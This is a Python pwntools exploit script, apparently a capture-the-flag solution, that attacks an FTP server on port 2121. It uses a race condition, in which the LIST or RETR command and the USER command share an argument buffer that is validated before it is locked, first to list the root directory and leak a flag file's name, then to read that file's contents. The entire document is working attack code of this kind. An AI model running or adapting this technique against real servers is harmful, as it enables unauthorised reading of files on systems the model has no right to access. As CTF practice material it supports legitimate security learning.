#!/usr/bin/env python3

from pwn import *

# context.log_level = logging.DEBUG

LOCAL_HOST = 'localhost'
HOST = '47.89.253.219'
PORT = 2121


def sla(after, before=b'\r\n'):
    r.sendlineafter(before, after + '\r')


r = remote(LOCAL_HOST, PORT)

# leak flag file name
sla('USER anonymous', 'server ready\r\n')
sla('PASS foo')
sla('EPSV')
r.recvuntil(b'|||')
data_port = int(r.recv(5))
info(f'data port: {data_port}')

sla('LIST /')
sla('USER /') # LIST and USER handlers share the same args buffer, whose content is validated before beeing locked -> race
r.recvuntil('\r\n')

data_r = remote(LOCAL_HOST, data_port)
d = str(data_r.recvall())
data_r.close()

flag_index  = d.find('flag.')
flag_file = d[flag_index:flag_index+41] 

info(f'flag file: {str(flag_file)}')

# leak flag content
sla('USER anonymous')
sla('PASS foo')
sla('EPSV')
r.recvuntil(b'|||')
data_port = int(r.recv(5))
info(f'data port: {data_port}')

sla('RETR hello.txt') # file needs to be valid
sla(f'USER /{flag_file}') # same race here

data_r = remote(LOCAL_HOST, data_port)
info(f'flag: {str(data_r.recvall())}')
data_r.close()

r.close()

